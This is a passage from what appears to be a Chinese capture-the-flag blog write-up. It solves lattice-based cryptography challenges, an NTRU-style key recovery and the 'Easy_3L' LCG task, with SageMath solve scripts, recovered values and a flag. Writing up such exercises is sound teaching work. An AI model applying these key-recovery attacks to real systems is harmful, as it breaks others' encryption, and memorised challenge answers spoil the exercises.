style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.058548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace nobreak"> </span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">h</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mspace nobreak"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace nobreak"> </span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.058548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace nobreak"> </span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">m</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace nobreak"> </span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">子</span><span class="mord cjk_fallback">模</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">得</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">c</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace nobreak"> </span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace nobreak"> </span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mclose">)</span></span></span></span></span></p><p>尤其注意一个点，就是在mod q的情况下继续模g 注意区分开，最终的f的-1次方是在模g下的逆元</p><p>拿下：</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535690.png" alt="image-20240521163717733"></p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">q = ...</span><br><span class="line">h = ...</span><br><span class="line">c = ...</span><br><span class="line">b = <span class="number">2</span>^<span class="number">1024</span></span><br><span class="line">Ge = Matrix(ZZ,[[<span class="number">1</span>,b*h],</span><br><span class="line">                [<span class="number">0</span>,b*q]])</span><br><span class="line"><span class="comment">#结果为 （f b*g）</span></span><br><span class="line"><span class="comment"># print(Ge.LLL())</span></span><br><span class="line">f,g = Ge.LLL()[<span class="number">0</span>]</span><br><span class="line">f,g = <span class="built_in">abs</span>(f),<span class="built_in">abs</span>(g)//b</span><br><span class="line"><span class="built_in">print</span>(f, g)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">m = (f * c % q) * gmpy2.invert(f, g) % g</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#写法二  额额 一模一样</span></span><br><span class="line">a = f*c % q % g</span><br><span class="line">m = a * inverse_mod(f, g) % g</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><p><code>b'flag&#123;7c95453a-e577-40d8-9ad0-993655b83b69&#125;'</code></p><h4 id="easy-3l">Easy_3L</h4><p>题目源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    p = getPrime(<span class="number">1400</span>)</span><br><span class="line">    f = getRandomNBitInteger(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        q = getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">if</span> gcd(f, q) != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    h = (invert(f, p) * q) % p</span><br><span class="line">    <span class="keyword">return</span> p, h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt1</span>(<span class="params">m</span>):</span><br><span class="line">    a = getPrime(<span class="number">250</span>)</span><br><span class="line">    b = getRandomNBitInteger(<span class="number">240</span>)</span><br><span class="line">    n = getPrime(<span class="number">512</span>)</span><br><span class="line">    seed = m</span><br><span class="line">    s = [<span class="number">0</span>] * <span class="number">6</span></span><br><span class="line">    s[<span class="number">0</span>] = seed</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        s[i] = (s[i - <span class="number">1</span>] * a + b) % n</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt2</span>(<span class="params">msg, p, h</span>):</span><br><span class="line">    s = getRandomNBitInteger(<span class="number">512</span>)</span><br><span class="line">    c = (s * h + msg) % p</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = encrypt1(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;S1 =&quot;</span>, s[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;S2 =&quot;</span>, s[<span class="number">2</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;S4 =&quot;</span>, s[<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;S5 =&quot;</span>, s[<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">p, h = get_key()</span><br><span class="line">c = encrypt2(s[<span class="number">3</span>], p, h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;h =&quot;</span>, h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># S1 = 28572152986082018877402362001567466234043851789360735202177142484311397443337910028526704343260845684960897697228636991096551426116049875141</span></span><br><span class="line"><span class="comment"># S2 = 1267231041216362976881495706209012999926322160351147349200659893781191687605978675590209327810284956626443266982499935032073788984220619657447889609681888</span></span><br><span class="line"><span class="comment"># S4 = 9739918644806242673966205531575183334306589742344399829232076845951304871478438938119813187502023845332528267974698273405630514228632721928260463654612997</span></span><br><span class="line"><span class="comment"># S5 = 9755668823764800147393276745829186812540710004256163127825800861195296361046987938775181398489372822667854079119037446327498475937494635853074634666112736</span></span><br><span class="line"><span class="comment"># p = 25886434964719448194352673440525701654705794467884891063997131230558866479588298264578120588832128279435501897537203249743883076992668855905005985050222145380285378634993563571078034923112985724204131887907198503097115380966366598622251191576354831935118147880783949022370177789175320661630501595157946150891275992785113199863734714343650596491139321990230671901990010723398037081693145723605154355325074739107535905777351</span></span><br><span class="line"><span class="comment"># h = 2332673914418001018316159191702497430320194762477685969994411366563846498561222483921873160125818295447435796015251682805613716554577537183122368080760105458908517619529332931042168173262127728892648742025494771751133664547888267249802368767396121189473647263861691578834674578112521646941677994097088669110583465311980605508259404858000937372665500663077299603396786862387710064061811000146453852819607311367850587534711</span></span><br><span class="line"><span class="comment"># c = 20329058681057003355767546524327270876901063126285410163862577312957425318547938475645814390088863577141554443432653658287774537679738768993301095388221262144278253212238975358868925761055407920504398004143126310247822585095611305912801250788531962681592054588938446210412897150782558115114462054815460318533279921722893020563472010279486838372516063331845966834180751724227249589463408168677246991839581459878242111459287</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对题目进行分析 很明显get_key一点用没有直接忽略</p><p>然后在encrypt1中捕捉到关键代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s[<span class="number">0</span>] = seed</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">s[i] = (s[i - <span class="number">1</span>] * a + b) % n</span><br></pre></td></tr></table></figure><p>这是一个lcg流密码伪随机数生成</p><p>其中已知s1、s2、s4、s5</p><p>然后最终的flag就是s0</p><p>想要恢复出初始的种子seed 就需要有连续的lcg生成数</p><p>所以锁定目标，求解s3</p><p>从而进入到encrypt2进行解密获得s3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = (s * h + msg) % p</span><br></pre></td></tr></table></figure><p>关键加密代码如上</p><p>进行变形：c = s * h + m - k * p</p><p>已知c，h，p  并且这三项位数相同 是1400位 比较大</p><p>然后s未知是512位</p><p>需要构建格密码求解m</p><p>将已知的内容作为构建格子M的内容 其系数提取到该格子的系数进行相乘</p><p>c - s * h + k * p = m</p><p>构造格子：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>h</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mn>2</mn><mn>512</mn></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>c</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>p</mi></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mspace linebreak="newline"></mspace><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">M=\begin{pmatrix}1&amp;0&amp;-h\\0&amp;2^{512}&amp;c\\0&amp;0&amp;p\end{pmatrix}\\\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎝</span></span></span><span style="top:-2.8100000000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎛</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathdefault">h</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">c</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎠</span></span></span><span style="top:-2.8100000000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎞</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="mspace newline"></span></span></span></span></p><p>其系数：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>s</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>k</mi></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mspace linebreak="newline"></mspace><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">\begin{pmatrix}s&amp;1&amp;k\end{pmatrix}\\\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span><span class="mspace newline"></span><span class="mspace newline"></span></span></span></span></p><p>两矩阵相乘结果：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>s</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mn>2</mn><mn>512</mn></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>m</mi></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mspace linebreak="newline"></mspace><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">\begin{pmatrix}s&amp;2^{512}&amp;m\end{pmatrix}\\\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span><span class="mspace newline"></span><span class="mspace newline"></span></span></span></span></p><p>我们构造盒子的标准在于其生成的结果要接近，且较小，起初使用2行2列的格式构建格子我们发现c会在结果中出现，因为c的长度过大，所以无法生成合适的规约数！！</p><p>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">25886434964719448194352673440525701654705794467884891063997131230558866479588298264578120588832128279435501897537203249743883076992668855905005985050222145380285378634993563571078034923112985724204131887907198503097115380966366598622251191576354831935118147880783949022370177789175320661630501595157946150891275992785113199863734714343650596491139321990230671901990010723398037081693145723605154355325074739107535905777351</span></span><br><span class="line">h = <span class="number">2332673914418001018316159191702497430320194762477685969994411366563846498561222483921873160125818295447435796015251682805613716554577537183122368080760105458908517619529332931042168173262127728892648742025494771751133664547888267249802368767396121189473647263861691578834674578112521646941677994097088669110583465311980605508259404858000937372665500663077299603396786862387710064061811000146453852819607311367850587534711</span></span><br><span class="line">c = <span class="number">20329058681057003355767546524327270876901063126285410163862577312957425318547938475645814390088863577141554443432653658287774537679738768993301095388221262144278253212238975358868925761055407920504398004143126310247822585095611305912801250788531962681592054588938446210412897150782558115114462054815460318533279921722893020563472010279486838372516063331845966834180751724227249589463408168677246991839581459878242111459287</span></span><br><span class="line"></span><br><span class="line">M = matrix(ZZ, [[<span class="number">1</span>, <span class="number">0</span>,-h], [<span class="number">0</span>, <span class="number">2</span>**<span class="number">512</span>,c],[<span class="number">0</span>,<span class="number">0</span>,p]])</span><br><span class="line">M = M.LLL()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(M[<span class="number">0</span>][<span class="number">2</span>])</span><br><span class="line"><span class="comment">#10700695166096094995375972320865971168959897437299342068124161538902514000691034236758289037664275323635047529647532200693311709347984126070052011571264606</span></span><br></pre></td></tr></table></figure><p>到此获得s3</p><p>最后根据s1到上s5反推s0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 